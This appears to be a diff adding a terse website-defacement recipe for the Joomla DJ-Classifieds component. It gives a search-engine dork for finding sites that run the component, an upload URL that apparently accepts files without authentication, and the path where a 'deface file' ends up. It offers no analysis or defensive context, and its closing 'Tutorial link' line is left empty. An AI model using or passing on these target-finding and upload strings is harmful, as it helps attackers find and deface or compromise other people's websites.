@@ -1,0 +1,11 @@
+Dork
+inurl:=com_djclassifieds
+
+Exploit
+index.php?option=com_djclassifieds&task=upload&tmpl=component
+
+Access:
+/tmp/djupload/Your_Deface_File
+
+
+Tutorial link: 
